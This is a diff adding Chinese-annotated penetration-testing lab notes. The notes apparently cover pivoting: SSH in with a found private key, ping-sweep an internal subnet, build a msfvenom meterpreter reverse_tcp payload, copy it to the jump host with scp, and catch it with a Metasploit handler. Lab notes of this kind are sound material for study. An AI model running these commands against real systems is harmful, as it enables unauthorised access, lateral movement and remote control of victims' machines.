@@ -335,8 +335,19 @@ LAB
   https://www.netbrain.com/
   https://app.diagrams.net/
 
-
-
+找到私钥，id_rsa
+chmod 600 id_rsa
+ssh -i id_rsa webadmin@10.129.88.197                                                                                      用私钥 SSH 到跳板
+ip a                                                                                                                      检查网卡，找到内网网段 172.16.5.15/16
+for i in {1..254};do (ping -c 1 172.16.5.$i | grep "bytes from" &); done                                                  bash 扫描内网
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=PWNIP LPORT=PWNPO -f elf -o 99c0b43c4bec2bdc280741d8f3e40338.elf      生成 playload
+scp -i id_rsa 99c0b43c4bec2bdc280741d8f3e40338.elf webadmin@STMIP:~/                                                      传输到跳板
+msfconsole -q
+use exploit/multi/handler
+set LHOST 0.0.0.0
+set LPORT PWNPO
+set PAYLOAD linux/x64/meterpreter/reverse_tcp
+run
 
 
 
